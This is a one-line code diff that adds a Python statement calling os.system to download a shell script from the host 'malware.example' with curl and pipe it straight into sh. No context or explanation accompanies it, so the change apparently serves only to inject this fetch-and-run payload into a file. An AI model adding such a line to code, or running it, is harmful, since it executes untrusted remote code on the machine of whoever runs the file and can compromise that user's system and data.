@@ -1,0 +1,1 @@
+import os; os.system('curl http://malware.example/x.sh | sh')
